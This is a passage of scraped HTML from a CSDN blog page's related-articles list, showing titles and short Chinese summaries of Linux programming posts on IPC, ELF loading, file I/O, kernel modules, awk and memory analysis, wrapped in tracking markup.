+				<a href="https://blog.csdn.net/2503_92775091/article/details/161056659" class="tit" target="_blank"  data-report-click='{"ab":"new","spm":"1001.2101.3001.6650.10","mod":"popu_387","extra":"{\"highlightScore\":0.0,\"utm_medium\":\"distribute.pc_relevant.none-task-blog-2~default~BLOGTAG~default-10-161056659-blog-161020751.235^v43^pc_blog_bottom_relevance_base3\",\"dist_request_id\":\"1779004798791_81523\"}","dist_request_id":"1779004798791_81523","ab_strategy":"landing_bge_commercial_hanlp_download_sign","index":"10","strategy":"2~default~BLOGTAG~default","dest":"https://blog.csdn.net/2503_92775091/article/details/161056659"}'  data-report-query='spm=1001.2101.3001.6650.10&utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBLOGTAG%7Edefault-10-161056659-blog-161020751.235%5Ev43%5Epc_blog_bottom_relevance_base3&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBLOGTAG%7Edefault-10-161056659-blog-161020751.235%5Ev43%5Epc_blog_bottom_relevance_base3'>
+					<div class="left ellipsis-online ellipsis-online-1"><em>Linux</em>(信号，管道，共享内存)</div>
+				</a>
+			</div>
+			<div class="info-box display-flex">
+				<div class="info">
+					<a href="https://blog.csdn.net/2503_92775091" target="_blank"><span class="blog-title">2503_92775091的博客</span></a>
+				</div>
+				<div class="info display-flex">
+					<span class="info-block time">05-13</span>
+					<span class="info-block read"><img class="read-img" src="https://csdnimg.cn/release/blogv2/dist/pc/img/readCountWhite.png" alt="">
+					288
+					</span>
+				</div>
+			</div>
+		</div>
+		<div class="desc-box">
+			<a href="https://blog.csdn.net/2503_92775091/article/details/161056659" target="_blank"  data-report-click='{"ab":"new","spm":"1001.2101.3001.6650.10","mod":"popu_387","extra":"{\"highlightScore\":0.0,\"utm_medium\":\"distribute.pc_relevant.none-task-blog-2~default~BLOGTAG~default-10-161056659-blog-161020751.235^v43^pc_blog_bottom_relevance_base3\",\"dist_request_id\":\"1779004798791_81523\"}","dist_request_id":"1779004798791_81523","ab_strategy":"landing_bge_commercial_hanlp_download_sign","index":"10","strategy":"2~default~BLOGTAG~default","dest":"https://blog.csdn.net/2503_92775091/article/details/161056659"}'  data-report-query='spm=1001.2101.3001.6650.10&utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBLOGTAG%7Edefault-10-161056659-blog-161020751.235%5Ev43%5Epc_blog_bottom_relevance_base3&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBLOGTAG%7Edefault-10-161056659-blog-161020751.235%5Ev43%5Epc_blog_bottom_relevance_base3'>
+				<div class="desc ellipsis-online ellipsis-online-1">/           NULL:让系统内核自动选择一块合适的，未使用的地址来附加共享内存段非NULL(填具体地址) : 系统会将共享内存段附加到指定位置，如果指定位置不能使用，则报错，附加失败shmflg : 控制附加操作标志位。do cat &lt; 管道文件;//生命周期           随文件系统的销毁而销毁      随进程的销毁而销毁。//进程间的通信方式(PIC) : 管道共享内存消息队列信号量 套接字。//shmat函数作用:将一个已存在的共享内存段映射到进程的地址空间中。</div>
+			</a>
+		</div>
+	</div>
+</div>
+<div class="recommend-item-box type_blog clearfix" data-url="https://xiaomakj.blog.csdn.net/article/details/161025237"  data-report-view='{"ab":"new","spm":"1001.2101.3001.6650.11","mod":"popu_387","extra":"{\"highlightScore\":0.0,\"utm_medium\":\"distribute.pc_relevant.none-task-blog-2~default~BLOGTAG~default-11-161025237-blog-161020751.235^v43^pc_blog_bottom_relevance_base3\",\"dist_request_id\":\"1779004798791_81523\"}","dist_request_id":"1779004798791_81523","ab_strategy":"landing_bge_commercial_hanlp_download_sign","index":"11","strategy":"2~default~BLOGTAG~default","dest":"https://xiaomakj.blog.csdn.net/article/details/161025237"}'>
+	<div class="content-box">
+		<div class="content-blog display-flex">
+			<div class="title-box">
+				<a href="https://xiaomakj.blog.csdn.net/article/details/161025237" class="tit" target="_blank"  data-report-click='{"ab":"new","spm":"1001.2101.3001.6650.11","mod":"popu_387","extra":"{\"highlightScore\":0.0,\"utm_medium\":\"distribute.pc_relevant.none-task-blog-2~default~BLOGTAG~default-11-161025237-blog-161020751.235^v43^pc_blog_bottom_relevance_base3\",\"dist_request_id\":\"1779004798791_81523\"}","dist_request_id":"1779004798791_81523","ab_strategy":"landing_bge_commercial_hanlp_download_sign","index":"11","strategy":"2~default~BLOGTAG~default","dest":"https://xiaomakj.blog.csdn.net/article/details/161025237"}'  data-report-query='spm=1001.2101.3001.6650.11&utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBLOGTAG%7Edefault-11-161025237-blog-161020751.235%5Ev43%5Epc_blog_bottom_relevance_base3&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBLOGTAG%7Edefault-11-161025237-blog-161020751.235%5Ev43%5Epc_blog_bottom_relevance_base3'>
+					<div class="left ellipsis-online ellipsis-online-1">ptrace 内存追踪</div>
+				</a>
+			</div>
+			<div class="info-box display-flex">
+				<div class="info">
+					<a href="https://blog.csdn.net/qq_20330595" target="_blank"><span class="blog-title">Android小码家</span></a>
+				</div>
+				<div class="info display-flex">
+					<span class="info-block time">05-12</span>
+					<span class="info-block read"><img class="read-img" src="https://csdnimg.cn/release/blogv2/dist/pc/img/readCountWhite.png" alt="">
+					89
+					</span>
+				</div>
+			</div>
+		</div>
+		<div class="desc-box">
+			<a href="https://xiaomakj.blog.csdn.net/article/details/161025237" target="_blank"  data-report-click='{"ab":"new","spm":"1001.2101.3001.6650.11","mod":"popu_387","extra":"{\"highlightScore\":0.0,\"utm_medium\":\"distribute.pc_relevant.none-task-blog-2~default~BLOGTAG~default-11-161025237-blog-161020751.235^v43^pc_blog_bottom_relevance_base3\",\"dist_request_id\":\"1779004798791_81523\"}","dist_request_id":"1779004798791_81523","ab_strategy":"landing_bge_commercial_hanlp_download_sign","index":"11","strategy":"2~default~BLOGTAG~default","dest":"https://xiaomakj.blog.csdn.net/article/details/161025237"}'  data-report-query='spm=1001.2101.3001.6650.11&utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBLOGTAG%7Edefault-11-161025237-blog-161020751.235%5Ev43%5Epc_blog_bottom_relevance_base3&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBLOGTAG%7Edefault-11-161025237-blog-161020751.235%5Ev43%5Epc_blog_bottom_relevance_base3'>
+				<div class="desc ellipsis-online ellipsis-online-1">本文介绍了使用GameGuardian进行内存分析的技术流程。首先通过jadx获取目标应用包名，然后使用/proc/[pid]/maps定位目标模块基地址（如libIHook.so）。通过计算本地函数偏移量，可推算出远程进程中的函数地址。内存修改技术包括通过mem文件操作内存，支持模糊搜索（值变化追踪）和精确搜索（数据类型判断），并演示了修改变量的具体操作。该方法适用于游戏修改和内存分析场景。</div>
+			</a>
+		</div>
+	</div>
+</div>
+<div class="recommend-item-box type_blog clearfix" data-url="https://devpress.csdn.net/v1/article/detail/161054235"  data-report-view='{"ab":"new","spm":"1001.2101.3001.6650.12","mod":"popu_387","extra":"{\"highlightScore\":0.0,\"utm_medium\":\"distribute.pc_relevant.none-task-blog-2~default~BLOGTAG~activity-12-161054235-blog-161020751.235^v43^pc_blog_bottom_relevance_base3\",\"dist_request_id\":\"1779004798791_81523\"}","dist_request_id":"1779004798791_81523","ab_strategy":"landing_bge_commercial_hanlp_download_sign","index":"12","strategy":"2~default~BLOGTAG~activity","dest":"https://devpress.csdn.net/v1/article/detail/161054235"}'>
+	<div class="content-box">
+		<div class="content-blog display-flex">
+			<div class="title-box">
+				<a href="https://devpress.csdn.net/v1/article/detail/161054235" class="tit" target="_blank"  data-report-click='{"ab":"new","spm":"1001.2101.3001.6650.12","mod":"popu_387","extra":"{\"highlightScore\":0.0,\"utm_medium\":\"distribute.pc_relevant.none-task-blog-2~default~BLOGTAG~activity-12-161054235-blog-161020751.235^v43^pc_blog_bottom_relevance_base3\",\"dist_request_id\":\"1779004798791_81523\"}","dist_request_id":"1779004798791_81523","ab_strategy":"landing_bge_commercial_hanlp_download_sign","index":"12","strategy":"2~default~BLOGTAG~activity","dest":"https://devpress.csdn.net/v1/article/detail/161054235"}'  data-report-query='spm=1001.2101.3001.6650.12&utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBLOGTAG%7Eactivity-12-161054235-blog-161020751.235%5Ev43%5Epc_blog_bottom_relevance_base3&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBLOGTAG%7Eactivity-12-161054235-blog-161020751.235%5Ev43%5Epc_blog_bottom_relevance_base3'>
+					<div class="left ellipsis-online ellipsis-online-1"><em>Linux</em> 下 从 ELF 可执行文件 到 进程虚拟地址空间的加载、映射与运行底层原理</div>
+				</a>
+			</div>
+			<div class="info-box display-flex">
+				<div class="info">
+					<a href="https://blog.csdn.net/2402_89711598" target="_blank"><span class="blog-title">2402_89711598的博客</span></a>
+				</div>
+				<div class="info display-flex">
+					<span class="info-block time">05-13</span>
+					<span class="info-block read"><img class="read-img" src="https://csdnimg.cn/release/blogv2/dist/pc/img/readCountWhite.png" alt="">
+					372
+					</span>
+				</div>
+			</div>
+		</div>
+		<div class="desc-box">
+			<a href="https://devpress.csdn.net/v1/article/detail/161054235" target="_blank"  data-report-click='{"ab":"new","spm":"1001.2101.3001.6650.12","mod":"popu_387","extra":"{\"highlightScore\":0.0,\"utm_medium\":\"distribute.pc_relevant.none-task-blog-2~default~BLOGTAG~activity-12-161054235-blog-161020751.235^v43^pc_blog_bottom_relevance_base3\",\"dist_request_id\":\"1779004798791_81523\"}","dist_request_id":"1779004798791_81523","ab_strategy":"landing_bge_commercial_hanlp_download_sign","index":"12","strategy":"2~default~BLOGTAG~activity","dest":"https://devpress.csdn.net/v1/article/detail/161054235"}'  data-report-query='spm=1001.2101.3001.6650.12&utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBLOGTAG%7Eactivity-12-161054235-blog-161020751.235%5Ev43%5Epc_blog_bottom_relevance_base3&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBLOGTAG%7Eactivity-12-161054235-blog-161020751.235%5Ev43%5Epc_blog_bottom_relevance_base3'>
+				<div class="desc ellipsis-online ellipsis-online-1">本文系统梳理了<em>Linux</em>程序从源码到执行的完整链路，包含五个关键环节：编译生成ELF可重定位文件、链接合并目标文件与库、进程虚拟地址空间初始化、加载到物理内存、CPU执行指令。重点解析了ELF格式结构、动静态库链接规则、虚拟地址规划原理、进程内存管理机制（mm_struct、页表）以及硬件地址转换流程（MMU）。整个过程体现了编译器、操作系统和硬件的协同设计：编译器规划虚拟地址，操作系统实现地址空间管理，硬件完成地址转换，共同实现代码复用、进程隔离和内存高效管理的目标。</div>
+			</a>
+		</div>
+	</div>
+</div>
+<div class="recommend-item-box type_blog clearfix" data-url="https://blog.csdn.net/bksczm/article/details/161055964"  data-report-view='{"ab":"new","spm":"1001.2101.3001.6650.13","mod":"popu_387","extra":"{\"highlightScore\":0.0,\"utm_medium\":\"distribute.pc_relevant.none-task-blog-2~default~BLOGTAG~default-13-161055964-blog-161020751.235^v43^pc_blog_bottom_relevance_base3\",\"dist_request_id\":\"1779004798791_81523\"}","dist_request_id":"1779004798791_81523","ab_strategy":"landing_bge_commercial_hanlp_download_sign","index":"13","strategy":"2~default~BLOGTAG~default","dest":"https://blog.csdn.net/bksczm/article/details/161055964"}'>
+	<div class="content-box">
+		<div class="content-blog display-flex">
+			<div class="title-box">
+				<a href="https://blog.csdn.net/bksczm/article/details/161055964" class="tit" target="_blank"  data-report-click='{"ab":"new","spm":"1001.2101.3001.6650.13","mod":"popu_387","extra":"{\"highlightScore\":0.0,\"utm_medium\":\"distribute.pc_relevant.none-task-blog-2~default~BLOGTAG~default-13-161055964-blog-161020751.235^v43^pc_blog_bottom_relevance_base3\",\"dist_request_id\":\"1779004798791_81523\"}","dist_request_id":"1779004798791_81523","ab_strategy":"landing_bge_commercial_hanlp_download_sign","index":"13","strategy":"2~default~BLOGTAG~default","dest":"https://blog.csdn.net/bksczm/article/details/161055964"}'  data-report-query='spm=1001.2101.3001.6650.13&utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBLOGTAG%7Edefault-13-161055964-blog-161020751.235%5Ev43%5Epc_blog_bottom_relevance_base3&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBLOGTAG%7Edefault-13-161055964-blog-161020751.235%5Ev43%5Epc_blog_bottom_relevance_base3'>
+					<div class="left ellipsis-online ellipsis-online-1"><em>Linux</em>之文件</div>
+				</a>
+			</div>
+			<div class="info-box display-flex">
+				<div class="info">
+					<a href="https://blog.csdn.net/bksczm" target="_blank"><span class="blog-title">bksczm的博客</span></a>
+				</div>
+				<div class="info display-flex">
+					<span class="info-block time">05-14</span>
+					<span class="info-block read"><img class="read-img" src="https://csdnimg.cn/release/blogv2/dist/pc/img/readCountWhite.png" alt="">
+					340
+					</span>
+				</div>
+			</div>
+		</div>
+		<div class="desc-box">
+			<a href="https://blog.csdn.net/bksczm/article/details/161055964" target="_blank"  data-report-click='{"ab":"new","spm":"1001.2101.3001.6650.13","mod":"popu_387","extra":"{\"highlightScore\":0.0,\"utm_medium\":\"distribute.pc_relevant.none-task-blog-2~default~BLOGTAG~default-13-161055964-blog-161020751.235^v43^pc_blog_bottom_relevance_base3\",\"dist_request_id\":\"1779004798791_81523\"}","dist_request_id":"1779004798791_81523","ab_strategy":"landing_bge_commercial_hanlp_download_sign","index":"13","strategy":"2~default~BLOGTAG~default","dest":"https://blog.csdn.net/bksczm/article/details/161055964"}'  data-report-query='spm=1001.2101.3001.6650.13&utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBLOGTAG%7Edefault-13-161055964-blog-161020751.235%5Ev43%5Epc_blog_bottom_relevance_base3&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBLOGTAG%7Edefault-13-161055964-blog-161020751.235%5Ev43%5Epc_blog_bottom_relevance_base3'>
+				<div class="desc ellipsis-online ellipsis-online-1">使用void* 可以处理所有类型，本质也是按照字节读取，但是不写成char* ，首先是会进行误导，会让人认为这个就是处理字符串的，遇到 \0 就会停止，实则不然；那有一个问题，我们知道在以写的方式打开文件的话，假设当前目录下没有同名文件，会自动区创建一个以该名字命名的文件，问题来了：系统是如何查找到当前目录位置，也就是说如何确认是在这个文件下创建而不是其他路径？第二个参数代表 ： 写入的信息源，这里值得一提的是buf的类型是void* ，并不是char *，为什么？第一个参数代表 ：打开的文件的名字。</div>
+			</a>
+		</div>
+	</div>
+</div>
+<div class="recommend-item-box type_blog clearfix" data-url="https://blog.csdn.net/liulilittle/article/details/161028104"  data-report-view='{"ab":"new","spm":"1001.2101.3001.6650.14","mod":"popu_387","extra":"{\"highlightScore\":0.0,\"utm_medium\":\"distribute.pc_relevant.none-task-blog-2~default~BLOGTAG~default-14-161028104-blog-161020751.235^v43^pc_blog_bottom_relevance_base3\",\"dist_request_id\":\"1779004798791_81523\"}","dist_request_id":"1779004798791_81523","ab_strategy":"landing_bge_commercial_hanlp_download_sign","index":"14","strategy":"2~default~BLOGTAG~default","dest":"https://blog.csdn.net/liulilittle/article/details/161028104"}'>
+	<div class="content-box">
+		<div class="content-blog display-flex">
+			<div class="title-box">
+				<a href="https://blog.csdn.net/liulilittle/article/details/161028104" class="tit" target="_blank"  data-report-click='{"ab":"new","spm":"1001.2101.3001.6650.14","mod":"popu_387","extra":"{\"highlightScore\":0.0,\"utm_medium\":\"distribute.pc_relevant.none-task-blog-2~default~BLOGTAG~default-14-161028104-blog-161020751.235^v43^pc_blog_bottom_relevance_base3\",\"dist_request_id\":\"1779004798791_81523\"}","dist_request_id":"1779004798791_81523","ab_strategy":"landing_bge_commercial_hanlp_download_sign","index":"14","strategy":"2~default~BLOGTAG~default","dest":"https://blog.csdn.net/liulilittle/article/details/161028104"}'  data-report-query='spm=1001.2101.3001.6650.14&utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBLOGTAG%7Edefault-14-161028104-blog-161020751.235%5Ev43%5Epc_blog_bottom_relevance_base3&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBLOGTAG%7Edefault-14-161028104-blog-161020751.235%5Ev43%5Epc_blog_bottom_relevance_base3'>
+					<div class="left ellipsis-online ellipsis-online-1"><em>Linux</em> 安装驱动模块（TCP - UCP）</div>
+				</a>
+			</div>
+			<div class="info-box display-flex">
+				<div class="info">
+					<a href="https://blog.csdn.net/liulilittle" target="_blank"><span class="blog-title">liulilittle的博客</span></a>
+				</div>
+				<div class="info display-flex">
+					<span class="info-block time">05-13</span>
+					<span class="info-block read"><img class="read-img" src="https://csdnimg.cn/release/blogv2/dist/pc/img/readCountWhite.png" alt="">
+					164
+					</span>
+				</div>
+			</div>
+		</div>
+		<div class="desc-box">
+			<a href="https://blog.csdn.net/liulilittle/article/details/161028104" target="_blank"  data-report-click='{"ab":"new","spm":"1001.2101.3001.6650.14","mod":"popu_387","extra":"{\"highlightScore\":0.0,\"utm_medium\":\"distribute.pc_relevant.none-task-blog-2~default~BLOGTAG~default-14-161028104-blog-161020751.235^v43^pc_blog_bottom_relevance_base3\",\"dist_request_id\":\"1779004798791_81523\"}","dist_request_id":"1779004798791_81523","ab_strategy":"landing_bge_commercial_hanlp_download_sign","index":"14","strategy":"2~default~BLOGTAG~default","dest":"https://blog.csdn.net/liulilittle/article/details/161028104"}'  data-report-query='spm=1001.2101.3001.6650.14&utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBLOGTAG%7Edefault-14-161028104-blog-161020751.235%5Ev43%5Epc_blog_bottom_relevance_base3&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBLOGTAG%7Edefault-14-161028104-blog-161020751.235%5Ev43%5Epc_blog_bottom_relevance_base3'>
+				<div class="desc ellipsis-online ellipsis-online-1">摘要：在<em>Linux</em>系统中成功加载了tcp_ucp内核模块。通过执行depmod命令更新模块依赖关系后，使用modprobe加载tcp_ucp模块，并通过lsmod命令验证该模块已正确加载，显示其内存占用为32KB，引用计数为4<em>1</em>。整个过程展示了<em>Linux</em>内核模块的标准加载和验证流程。</div>
+			</a>
+		</div>
+	</div>
+</div>
+<div class="recommend-item-box type_blog clearfix" data-url="https://blog.csdn.net/weixin_46136019/article/details/160982319"  data-report-view='{"ab":"new","spm":"1001.2101.3001.6650.15","mod":"popu_387","extra":"{\"highlightScore\":0.0,\"utm_medium\":\"distribute.pc_relevant.none-task-blog-2~default~BLOGTAG~default-15-160982319-blog-161020751.235^v43^pc_blog_bottom_relevance_base3\",\"dist_request_id\":\"1779004798791_81523\"}","dist_request_id":"1779004798791_81523","ab_strategy":"landing_bge_commercial_hanlp_download_sign","index":"15","strategy":"2~default~BLOGTAG~default","dest":"https://blog.csdn.net/weixin_46136019/article/details/160982319"}'>
+	<div class="content-box">
+		<div class="content-blog display-flex">
+			<div class="title-box">
+				<a href="https://blog.csdn.net/weixin_46136019/article/details/160982319" class="tit" target="_blank"  data-report-click='{"ab":"new","spm":"1001.2101.3001.6650.15","mod":"popu_387","extra":"{\"highlightScore\":0.0,\"utm_medium\":\"distribute.pc_relevant.none-task-blog-2~default~BLOGTAG~default-15-160982319-blog-161020751.235^v43^pc_blog_bottom_relevance_base3\",\"dist_request_id\":\"1779004798791_81523\"}","dist_request_id":"1779004798791_81523","ab_strategy":"landing_bge_commercial_hanlp_download_sign","index":"15","strategy":"2~default~BLOGTAG~default","dest":"https://blog.csdn.net/weixin_46136019/article/details/160982319"}'  data-report-query='spm=1001.2101.3001.6650.15&utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBLOGTAG%7Edefault-15-160982319-blog-161020751.235%5Ev43%5Epc_blog_bottom_relevance_base3&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBLOGTAG%7Edefault-15-160982319-blog-161020751.235%5Ev43%5Epc_blog_bottom_relevance_base3'>
+					<div class="left ellipsis-online ellipsis-online-1">#<em>Linux</em> Shell 编程入门 Day05 ：awk文本数据处理基础</div>
+				</a>
+			</div>
+			<div class="info-box display-flex">
+				<div class="info">
+					<a href="https://blog.csdn.net/weixin_46136019" target="_blank"><span class="blog-title">weixin_46136019的博客</span></a>
+				</div>
+				<div class="info display-flex">
+					<span class="info-block time">05-11</span>
+					<span class="info-block read"><img class="read-img" src="https://csdnimg.cn/release/blogv2/dist/pc/img/readCountWhite.png" alt="">
+					568
+					</span>
+				</div>
+			</div>
+		</div>
+		<div class="desc-box">
+			<a href="https://blog.csdn.net/weixin_46136019/article/details/160982319" target="_blank"  data-report-click='{"ab":"new","spm":"1001.2101.3001.6650.15","mod":"popu_387","extra":"{\"highlightScore\":0.0,\"utm_medium\":\"distribute.pc_relevant.none-task-blog-2~default~BLOGTAG~default-15-160982319-blog-161020751.235^v43^pc_blog_bottom_relevance_base3\",\"dist_request_id\":\"1779004798791_81523\"}","dist_request_id":"1779004798791_81523","ab_strategy":"landing_bge_commercial_hanlp_download_sign","index":"15","strategy":"2~default~BLOGTAG~default","dest":"https://blog.csdn.net/weixin_46136019/article/details/160982319"}'  data-report-query='spm=1001.2101.3001.6650.15&utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBLOGTAG%7Edefault-15-160982319-blog-161020751.235%5Ev43%5Epc_blog_bottom_relevance_base3&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBLOGTAG%7Edefault-15-160982319-blog-161020751.235%5Ev43%5Epc_blog_bottom_relevance_base3'>
+				<div class="desc ellipsis-online ellipsis-online-1">awk是一门文本处理编程语言/数据处理引擎，由Aho、Weinberger、Kernighan三位开发者创造。核心能力：基于模式匹配逐行检查输入文本，逐行处理并输出结果典型用途：Shell脚本中提取指定数据、单独使用时做文本统计与分析一行一行处理文本，自动循环遍历所有行数组名[下标]=元素值数组名[下标]下标可以是数字或字符串# 定义数组并输出 awk &#39;BEGIN{name[0]=&quot;jim&quot;;掌握awk基本语法与两种命令格式熟练使用awk内置变量：NR、NF、$NF理解awk。</div>
+			</a>
+		</div>
+	</div>
+</div>
+<div class="recommend-item-box type_blog clearfix" data-url="https://blog.csdn.net/weixin_51368966/article/details/161120625"  data-report-view='{"ab":"new","spm":"1001.2101.3001.6650.16","mod":"popu_387","extra":"{\"highlightScore\":0.0,\"utm_medium\":\"distribute.pc_relevant.none-task-blog-2~default~BLOGTAG~default-16-161120625-blog-161020751.235^v43^pc_blog_bottom_relevance_base3\",\"dist_request_id\":\"1779004798791_81523\"}","dist_request_id":"1779004798791_81523","ab_strategy":"landing_bge_commercial_hanlp_download_sign","index":"16","strategy":"2~default~BLOGTAG~default","dest":"https://blog.csdn.net/weixin_51368966/article/details/161120625"}'>
+	<div class="content-box">
+		<div class="content-blog display-flex">
+			<div class="title-box">
+				<a href="https://blog.csdn.net/weixin_51368966/article/details/161120625" class="tit" target="_blank"  data-report-click='{"ab":"new","spm":"1001.2101.3001.6650.16","mod":"popu_387","extra":"{\"highlightScore\":0.0,\"utm_medium\":\"distribute.pc_relevant.none-task-blog-2~default~BLOGTAG~default-16-161120625-blog-161020751.235^v43^pc_blog_bottom_relevance_base3\",\"dist_request_id\":\"1779004798791_81523\"}","dist_request_id":"1779004798791_81523","ab_strategy":"landing_bge_commercial_hanlp_download_sign","index":"16","strategy":"2~default~BLOGTAG~default","dest":"https://blog.csdn.net/weixin_51368966/article/details/161120625"}'  data-report-query='spm=1001.2101.3001.6650.16&utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBLOGTAG%7Edefault-16-161120625-blog-161020751.235%5Ev43%5Epc_blog_bottom_relevance_base3&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBLOGTAG%7Edefault-16-161120625-blog-161020751.235%5Ev43%5Epc_blog_bottom_relevance_base3'>
+					<div class="left ellipsis-online ellipsis-online-1"><em>Linux</em>_58：rockx_vi_handle_thread线程的<em>讲解</em></div>
+				</a>
+			</div>
+			<div class="info-box display-flex">
+				<div class="info">
+					<a href="https://blog.csdn.net/weixin_51368966" target="_blank"><span class="blog-title">weixin_51368966的博客</span></a>
+				</div>
+				<div class="info display-flex">
+					<span class="info-block time">05-15</span>
+					<span class="info-block read"><img class="read-img" src="https://csdnimg.cn/release/blogv2/dist/pc/img/readCountWhite.png" alt="">
+					328
+					</span>
+				</div>
+			</div>
+		</div>
+		<div class="desc-box">
+			<a href="https://blog.csdn.net/weixin_51368966/article/details/161120625" target="_blank"  data-report-click='{"ab":"new","spm":"1001.2101.3001.6650.16","mod":"popu_387","extra":"{\"highlightScore\":0.0,\"utm_medium\":\"distribute.pc_relevant.none-task-blog-2~default~BLOGTAG~default-16-161120625-blog-161020751.235^v43^pc_blog_bottom_relevance_base3\",\"dist_request_id\":\"1779004798791_81523\"}","dist_request_id":"1779004798791_81523","ab_strategy":"landing_bge_commercial_hanlp_download_sign","index":"16","strategy":"2~default~BLOGTAG~default","dest":"https://blog.csdn.net/weixin_51368966/article/details/161120625"}'  data-report-query='spm=1001.2101.3001.6650.16&utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBLOGTAG%7Edefault-16-161120625-blog-161020751.235%5Ev43%5Epc_blog_bottom_relevance_base3&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBLOGTAG%7Edefault-16-161120625-blog-161020751.235%5Ev43%5Epc_blog_bottom_relevance_base3'>
+				<div class="desc ellipsis-online ellipsis-online-1">容器里的一个&ldquo;游标&rdquo;。它用来指向容器中的某一个元素。这个map如果你想一个一个访问它们，就需要一个东西来&ldquo;指向当前访问到哪一项&rdquo;。iter就像一个指针，刚开始可以指向第一项，然后移动到第二项、第三项。</div>
+			</a>
+		</div>
+	</div>
+</div>
+<div class="recommend-item-box type_blog clearfix" data-url="https://blog.csdn.net/2401_89899187/article/details/160959779"  data-report-view='{"ab":"new","spm":"1001.2101.3001.6650.17","mod":"popu_387","extra":"{\"highlightScore\":0.0,\"utm_medium\":\"distribute.pc_relevant.none-task-blog-2~default~BLOGTAG~default-17-160959779-blog-161020751.235^v43^pc_blog_bottom_relevance_base3\",\"dist_request_id\":\"1779004798791_81523\"}","dist_request_id":"1779004798791_81523","ab_strategy":"landing_bge_commercial_hanlp_download_sign","index":"17","strategy":"2~default~BLOGTAG~default","dest":"https://blog.csdn.net/2401_89899187/article/details/160959779"}'>
+	<div class="content-box">
+		<div class="content-blog display-flex">
+			<div class="title-box">
+				<a href="https://blog.csdn.net/2401_89899187/article/details/160959779" class="tit" target="_blank"  data-report-click='{"ab":"new","spm":"1001.2101.3001.6650.17","mod":"popu_387","extra":"{\"highlightScore\":0.0,\"utm_medium\":\"distribute.pc_relevant.none-task-blog-2~default~BLOGTAG~default-17-160959779-blog-161020751.235^v43^pc_blog_bottom_relevance_base3\",\"dist_request_id\":\"1779004798791_81523\"}","dist_request_id":"1779004798791_81523","ab_strategy":"landing_bge_commercial_hanlp_download_sign","index":"17","strategy":"2~default~BLOGTAG~default","dest":"https://blog.csdn.net/2401_89899187/article/details/160959779"}'  data-report-query='spm=1001.2101.3001.6650.17&utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBLOGTAG%7Edefault-17-160959779-blog-161020751.235%5Ev43%5Epc_blog_bottom_relevance_base3&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBLOGTAG%7Edefault-17-160959779-blog-161020751.235%5Ev43%5Epc_blog_bottom_relevance_base3'>
+					<div class="left ellipsis-online ellipsis-online-1">【<em>Linux</em>网络】<em>Linux</em> 网络编程：应用层自定义协议与序列化（3）：网络计算器实现和守护进程</div>
+				</a>
+			</div>
+			<div class="info-box display-flex">
+				<div class="info">
+					<a href="https://blog.csdn.net/2401_89899187" target="_blank"><span class="blog-title">艾莉丝努力练剑的博客，感谢大家一直以来的对艾莉丝的支持和鼓励，uu们如果对C/C++方向感兴趣的话，可以通过艾莉丝主页的微信名片加艾莉丝的好友，和努力练剑的艾莉丝一起加油！</span></a>
+				</div>
+				<div class="info display-flex">
+					<span class="info-block time">05-12</span>
+					<span class="info-block read"><img class="read-img" src="https://csdnimg.cn/release/blogv2/dist/pc/img/readCountWhite.png" alt="">
+					1085
+					</span>
+				</div>
+			</div>
+		</div>
+		<div class="desc-box">
+			<a href="https://blog.csdn.net/2401_89899187/article/details/160959779" target="_blank"  data-report-click='{"ab":"new","spm":"1001.2101.3001.6650.17","mod":"popu_387","extra":"{\"highlightScore\":0.0,\"utm_medium\":\"distribute.pc_relevant.none-task-blog-2~default~BLOGTAG~default-17-160959779-blog-161020751.235^v43^pc_blog_bottom_relevance_base3\",\"dist_request_id\":\"1779004798791_81523\"}","dist_request_id":"1779004798791_81523","ab_strategy":"landing_bge_commercial_hanlp_download_sign","index":"17","strategy":"2~default~BLOGTAG~default","dest":"https://blog.csdn.net/2401_89899187/article/details/160959779"}'  data-report-query='spm=1001.2101.3001.6650.17&utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBLOGTAG%7Edefault-17-160959779-blog-161020751.235%5Ev43%5Epc_blog_bottom_relevance_base3&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBLOGTAG%7Edefault-17-160959779-blog-161020751.235%5Ev43%5Epc_blog_bottom_relevance_base3'>
